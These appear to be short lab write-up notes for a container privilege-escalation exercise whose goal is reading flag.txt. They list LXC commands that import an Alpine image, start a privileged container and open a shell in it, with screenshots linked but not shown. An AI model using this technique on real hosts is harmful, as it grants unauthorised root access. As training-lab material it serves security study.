# [Containers](Containers.md)
### Escalate the privileges and submit the contents of flag.txt as the answer.

```shell
lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpinetmp
```
![](Screenshot%202026-08-09%20at%2014.03.25.png)

```shell
lxc image list
```
![](Screenshot%202026-08-09%20at%2014.03.57.png)

```shell
lxc init alpinetmp privesc -c security.privileged=true

lxc start privesc

lxc exec privesc -- /bin/sh
```
![](Screenshot%202026-08-09%20at%2014.08.15.png)